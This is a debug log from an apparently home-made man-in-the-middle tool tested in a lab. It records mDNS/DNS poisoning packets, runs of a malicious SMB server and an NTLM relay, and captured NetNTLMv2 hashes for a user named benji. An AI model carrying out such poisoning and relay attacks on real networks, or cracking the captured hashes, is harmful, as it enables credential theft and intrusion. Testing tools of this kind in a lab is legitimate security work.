2021-11-07 11:27:37.588 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_ntlm_relay:390 - Starting ntlm relay attack using lhost: 192.168.253.135 rhost:192.168.253.129 ipv6:fe80::20c:29ff:fe89:df69
2021-11-12 15:00:07.699 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-12 15:00:07.700 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-12 15:00:16.028 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:16.028 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:16.028 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:00:16.059 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:16.059 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:16.059 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:00:16.091 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:16.091 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:16.092 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:16.092 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:17.015 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49837)
2021-11-12 15:00:17.023 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-12 15:00:17.024 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-12 15:00:17.024 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:147b7ca3fc97dd62b891127c8ded9749:010100000000000080d6f800d6d7d701e68552a02d1589fa00000000010010006a005200520072004f006d0049004900030010006a005200520072004f006d00490049000200100063004f004500610051005700440067000400100063004f004500610051005700440067000700080080d6f800d6d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a001000000000000000000000000000000000000900300063006900660073002f0061006a00640073006c006b0066006a006c006100640066006a002e006c006f00630061006c000000000000000000
2021-11-12 15:00:17.025 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-12 15:00:17.039 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:00:17.323 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:17.324 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:17.328 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:17.329 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:17.333 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:17.334 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:17.338 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:17.339 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:18.330 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:18.330 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:18.331 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:00:18.379 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:18.380 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:18.380 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:00:18.433 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:18.434 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:18.437 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:00:18.437 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:00:27.795 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-12 15:00:27.804 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49837)
2021-11-12 15:00:27.807 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-12 15:00:31.130 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-12 15:01:14.513 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:182 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-12 15:01:14.515 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-12 15:01:14.520 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:203 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-12 15:01:14.526 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-12 15:01:14.527 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-12 15:01:14.532 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-12 15:01:14.534 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - None
2021-11-12 15:01:14.540 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-12 15:01:14.540 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - None
2021-11-12 15:01:14.541 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-12 15:01:14.542 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - None
2021-11-12 15:01:18.306 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-12 15:04:53.461 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-12 15:04:53.461 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-12 15:04:53.465 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-12 15:04:53.469 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-12 15:04:53.470 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-12 15:04:53.473 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-12 15:04:53.474 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:04:53.474 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-12 15:04:53.475 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:04:53.476 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-12 15:04:53.476 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:05:05.103 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:05:05.103 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:05:05.104 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:05:05.135 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:05:05.135 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:05:05.135 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:05:05.171 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:05:05.171 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:05:05.172 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:05:05.172 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:05:06.110 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:05:06.111 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:05:06.117 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:05:06.118 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:05:06.120 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49839)
2021-11-12 15:05:06.121 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:05:06.365 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-12 15:05:06.366 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:05:06.367 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-12 15:05:06.368 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:05:06.369 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:4e4df58e51789fa99c2fad97bd404d70:010100000000000000bd3aadd6d7d70113b622f8a38d4d7500000000010010007900790062007a0050004d0075004e00030010007900790062007a0050004d0075004e0002001000430049004c0078007a0041004b006f0004001000430049004c0078007a0041004b006f000700080000bd3aadd6d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002e0063006900660073002f00660069006e0061006c0069007a00610061006100610061002e006c006f00630061006c000000000000000000
2021-11-12 15:05:06.369 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:05:06.370 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:48 - holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
2021-11-12 15:05:06.371 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-12 15:05:06.371 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:05:06.408 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrWkstaGetInfo Level: 100
2021-11-12 15:05:06.409 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:05:06.437 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrServerGetInfo Level: 101
2021-11-12 15:05:06.438 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:05:07.656 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:05:07.658 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:05:16.394 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-12 15:07:47.317 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-12 15:07:47.318 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-12 15:07:47.322 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-12 15:07:47.330 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-12 15:07:47.331 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-12 15:07:47.335 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-12 15:07:47.336 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:07:47.336 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-12 15:07:47.337 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:07:47.337 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-12 15:07:47.337 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:07:52.947 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:52.948 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:52.948 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:07:52.991 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:52.992 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:52.992 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:07:53.036 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:53.037 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:53.043 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:53.044 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:53.923 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:53.924 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:53.926 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:53.926 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:53.926 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49841)
2021-11-12 15:07:53.927 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:07:53.935 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-12 15:07:53.935 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:07:53.936 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-12 15:07:53.936 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:07:53.937 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:c30a6e5952643e4615a1da67dd5a264f:010100000000000080eac410d7d7d701a78c346e5bf2b029000000000100100077006a006d006c0049004500470068000300100077006a006d006c004900450047006800020010005a006e006d007100700054005a004500040010005a006e006d007100700054005a0045000700080080eac410d7d7d70106000400020000000800300030000000000000000000000000200000d3f4deb97c25aa607459febd149f3839f68038160c2700c9ec376df7d6a3a2890a0010000000000000000000000000000000000009002e0063006900660073002f00660069006e0061006c0069007a00610061006100610061002e006c006f00630061006c000000000000000000
2021-11-12 15:07:53.937 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:07:53.937 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:48 - holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
2021-11-12 15:07:53.938 | INFO     | impacket.smbserver:log:4132 - Could not write NTLM Hashes to the specified JTR_Dump_Path 
2021-11-12 15:07:53.938 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:07:53.953 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-12 15:07:53.954 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:07:54.569 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:54.569 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:54.570 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:54.571 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:54.572 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:54.572 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:54.573 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:54.573 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:55.894 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:55.895 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:07:55.900 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:07:55.902 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:08:03.998 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:110 - Exiting smb relay attack ...
2021-11-12 15:08:59.870 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-12 15:08:59.871 | DEBUG    | project.igris:check_settable_variables_value:192 - Checking the correct value of the necessary settable variables 
2021-11-12 15:08:59.875 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:204 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-12 15:08:59.884 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-12 15:08:59.885 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:67 - Starting Malicious SMB Server ...
2021-11-12 15:08:59.894 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-12 15:08:59.903 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:08:59.906 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-12 15:08:59.906 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:08:59.907 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-12 15:08:59.908 | INFO     | project.ManInTheMiddle.servers.interceptlogging:emit:43 - []
2021-11-12 15:09:02.629 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:02.630 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:02.631 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-12 15:09:02.670 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:02.670 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:02.670 | INFO     | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-12 15:09:02.717 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:02.717 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:02.720 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:02.721 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:03.185 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:03.186 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:03.190 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:03.191 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:04.177 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:04.178 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:04.182 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:04.183 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:05.448 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:05.448 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:05.449 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:05.449 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:05.451 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:05.451 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:05.452 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:05.452 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:06.443 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:06.444 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:06.938 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:06.939 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:09.422 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:09.423 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-12 15:09:09.428 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-12 15:09:09.428 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
